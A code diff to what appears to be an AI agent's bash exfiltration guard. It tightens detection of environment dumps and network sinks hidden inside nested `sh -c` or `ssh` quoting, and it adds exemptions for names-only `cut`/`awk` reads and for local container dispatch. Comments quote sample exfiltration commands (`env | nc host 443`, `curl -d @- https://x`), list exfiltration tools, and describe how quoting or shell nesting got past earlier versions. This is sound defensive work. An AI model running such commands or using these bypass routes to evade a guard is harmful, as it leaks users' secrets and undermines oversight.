@@ -160,8 +160,13 @@ export const DISCOVERY_EXFIL = new Set([
 // A real network invocation: the tool name at the start of a command position
 // (start of string, after a shell separator, or after sudo/env). This is
 // stricter than a word-boundary match on the tool name, which fires on prose.
+// A sink counts when it is in COMMAND POSITION. The separators are augmented
+// with the argv of an inner shell (`sh -c`, `bash -lc`), because
+// `docker exec app sh -c 'curl -d @- https://x'` places `curl` after `-c`, not
+// after `;`. 0.13.2: without this, quoting the sink made it invisible and the
+// whole dump-detection fix could be stepped around by nesting one shell deeper.
 export const EXFIL_INVOCATION_RE = new RegExp(
-  "(?:^|[;&|(]|\\$\\()\\s*(?:sudo\\s+)?(?:" +
+  "(?:^|[;&|(]|\\$\\(|\\b[a-z]*sh\\s+-[a-z]*c)\\s*(?:sudo\\s+)?(?:" +
     [...DISCOVERY_EXFIL].sort((a, b) => b.length - a.length).join("|") +
     ")\\b",
   "i"
@@ -298,13 +303,35 @@ export function isNamesOnlyInspection(command: string): boolean {
     .replace(/['"]/g, "");
 
   const g = /\bgrep\s+(?:-[a-zA-Z]*o[a-zA-Z]*|--only-matching)\s+(\S+)\s+(\S+)(?:\s|$)/.exec(deq);
-  if (!g) return false;
-  const pattern = g[1]!;
-  const file = g[2]!;
-  if (!isNamesOnlyPattern(pattern)) return false;
-  if (!SENSITIVE_PATH_RE.test(withoutGoTemplates(file))) return false;
+  const c = /\bcut\s+(?:-d\s*(\S+)|--delimiter[= ](\S+))?\s*((?:-[a-zA-Z0-9]+\s+)*)(\S+)/.exec(deq);
+  const a = /\bawk\s+(?:-F\s*(\S+)|--field-separator[= ](\S+))\s*'?([^']*)'?\s+(\S*)/.exec(deq);
 
-  const rest = deq.replace(g[0], " ");
+  if (g) {
+    const pattern = g[1]!;
+    const file = g[2]!;
+    if (!isNamesOnlyPattern(pattern)) return false;
+    if (!SENSITIVE_PATH_RE.test(withoutGoTemplates(file))) return false;
+  } else if (c) {
+    // `cut -d= -f1 FILE`: field 1 is the NAME. Field 2+ is the value, and
+    // `-c` (characters) or a range (`-f1-2`, `-f1,2`) can reach past the `=`.
+    const flags = c[3] || "";
+    const file = c[4]!;
+    if (!/-f\s*1(\s|$)/.test(flags)) return false;
+    if (/-c\b|\b--characters\b/.test(flags)) return false;
+    if (/[-,]/.test(flags.replace(/-f\s*1(\s|$)/, ""))) return false;
+    if (!SENSITIVE_PATH_RE.test(withoutGoTemplates(file))) return false;
+  } else if (a) {
+    // `awk -F= '{print $1}' FILE`: field 1 only. `$2`, `$0`, `print` with no
+    // field, or any expression can emit the value side.
+    const prog = a[3] || "";
+    const file = a[4]!;
+    if (!/^\s*\{\s*print\s+\$1\s*\}\s*$/.test(prog)) return false;
+    if (!file || !SENSITIVE_PATH_RE.test(withoutGoTemplates(file))) return false;
+  } else {
+    return false;
+  }
+
+  const rest = deq.replace(g ? g[0] : (c ? c[0] : a![0]), " ");
   if (SENSITIVE_PATH_RE.test(withoutGoTemplates(rest))) return false;
   if (SECRET_KEY_RE.test(rest)) return false;
   if (ENV_DUMP_RE.test(rest.toLowerCase())) return false;
@@ -314,7 +341,7 @@ export function isNamesOnlyInspection(command: string): boolean {
   // produced, and ssh is the transport that was just validated.
   const forbidden = [
     "cat", "tee", "cp", "mv", "scp", "rsync", "dd", "tar", "zip", "gzip",
-    "base64", "xxd", "hexdump", "openssl", "gpg", "sed", "awk", "python",
+    "base64", "xxd", "hexdump", "openssl", "gpg", "sed", "python",
     "python3", "node", "ruby", "perl", "jq", "yq", "source", "curl", "wget",
     "nc", "netcat", "socat", "ftp", "sftp", "nmap",
   ];
@@ -510,11 +537,43 @@ export function checkBashExfil(command: string): string | undefined {
   const lower = normalized.toLowerCase();
   const deobfuscatedLower = deobfuscated.toLowerCase();
 
-  if (ENV_DUMP_RE.test(lower)) {
+  // 0.13.2 fix A -- quoting was a free bypass for an env dump.
+  //
+  // ENV_DUMP_RE anchors on a shell separator, so inside `ssh h 'env | nc host
+  // 443'` the `env` is preceded by a quote and never matched. The egress test
+  // below already judged the DEQUOTED copy; the dump test did not, so the two
+  // disagreed and every `sh -c '...'` / `bash -lc '...'` moved the dump one
+  // quoting level down and out of reach. Judge both spellings.
+  if (ENV_DUMP_RE.test(lower) || ENV_DUMP_RE.test(deobfuscatedLower)) {
     return "command attempts to dump environment variables";
   }
+
+  // 0.13.2 fix B -- expanding a credential into a LOCAL container is not egress.
+  //
+  // `docker exec app sh -c 'curl -H "Authorization: Bearer $KEY"'` interpolates
+  // the key inside a container on this machine, for a host the caller already
+  // controls. Nothing crosses a network boundary the caller chose. Treating it
+  // as exfiltration blocked the ordinary way to run an authenticated request
+  // inside one's own stack, and the workaround was a script -- i.e. the guard
+  // taught a bypass. `ssh`-as-transport is NOT local: the argv string is what
+  // the remote host receives, so only `docker exec`/`podman exec` plus an inner
+  // shell qualifies.
+  // `ssh` makes the expansion remote: the argv string is what the remote host
+  // receives, so `ssh h 'docker exec app sh -c "... $KEY"'` puts the value on
+  // the wire even though a container appears in the chain. Only a dispatch that
+  // never leaves this machine qualifies as local.
+  const overSsh = /(?:^|[;&|(]|\s)ssh\s/.test(deobfuscatedLower);
+  const localContainerDispatch =
+    !overSsh &&
+    /\b(?:docker|podman)\s+exec\b/.test(deobfuscatedLower) &&
+    /\b(?:sh|bash|zsh|dash|ksh)\b\s+-[a-z]*c\b/.test(deobfuscatedLower);
+
   if (SENSITIVE_EXPANSION_RE.test(command)) {
-    return "command references sensitive environment variable names";
+    if (!localContainerDispatch) {
+      return "command references sensitive environment variable names";
+    }
+    // Local dispatch: fall through. A sensitive PATH still blocks below, since
+    // the file would have to be read.
   }
 
   const hasEncodeTool = [...ENCODE_TOOLS].some((t) => containsWord(deobfuscatedLower, t));
@@ -544,11 +603,36 @@ export function checkBashExfil(command: string): string | undefined {
     // enforcement disagreed. Every other mention of the path still blocks.
     const judged = withoutGoTemplates(command);
     if (isNamesOnlyInspection(command)) return undefined;
-    if (
-      SECRET_KEY_RE.test(judged) ||
-      ENV_DUMP_RE.test(judged.toLowerCase()) ||
-      SENSITIVE_PATH_RE.test(judged)
-    ) {
+
+    const pathRisk = SENSITIVE_PATH_RE.test(judged);
+    // The `Authorization`-style header name is not itself the secret; only the
+    // value is. With a local container dispatch and no sensitive path, what is
+    // left is a header name plus an expansion that never left this machine --
+    // UNLESS the local container is instructed to reach an outside host, which
+    // is the same exfiltration with one extra hop. Loopback/RFC1918 targets and
+    // `@-` (stdin) are the ordinary internal shapes.
+    // A local container that is told to reach an outside host is exfiltration
+    // with one extra hop. Internal targets are the ordinary shape and must not
+    // count: loopback, RFC1918 literals, and internal service names
+    // (`*.internal`, `*.local`, single-label hosts like `api`).
+    const URL_HOST_RE = new RegExp("\\b(?:https?|ftp)://([^/:\\s?#]+)", "i");
+    // Internal targets are the ordinary shape and must not count: RFC1918 and
+    // loopback literals, `*.internal` / `*.local` suffixes, and single-label
+    // service names (`ingress`, `api`, `bifrost`) which cannot resolve publicly.
+    const INTERNAL_HOST_RE = new RegExp(
+      "^(?:localhost|127\\.[0-9.]+|10\\.[0-9.]+|192\\.168\\.[0-9.]+|172\\.(?:1[6-9]|2\\d|3[01])\\.[0-9.]+)$" +
+        "|(?:^|\\.)(?:internal|local|localhost|svc)$" +
+        "|^[a-z][a-z0-9-]*$",
+      "i"
+    );
+    const urlHost = URL_HOST_RE.exec(judged)?.[1];
+    const urlHostIsOutside = urlHost ? !INTERNAL_HOST_RE.test(urlHost) : false;
+    const OUTSIDE_NC_RE = new RegExp("\\b(?:nc|netcat|ncat|socat)\\s+(?!localhost|127\\.)\\S+\\s+\\d+", "i");
+    const reachesOutside = urlHostIsOutside || OUTSIDE_NC_RE.test(judged);
+    const nameRisk = (SECRET_KEY_RE.test(judged) && !localContainerDispatch) ||
+                     (localContainerDispatch && reachesOutside);
+
+    if (nameRisk || pathRisk) {
       return "command combines network discovery/transfer with sensitive material";
     }
   }
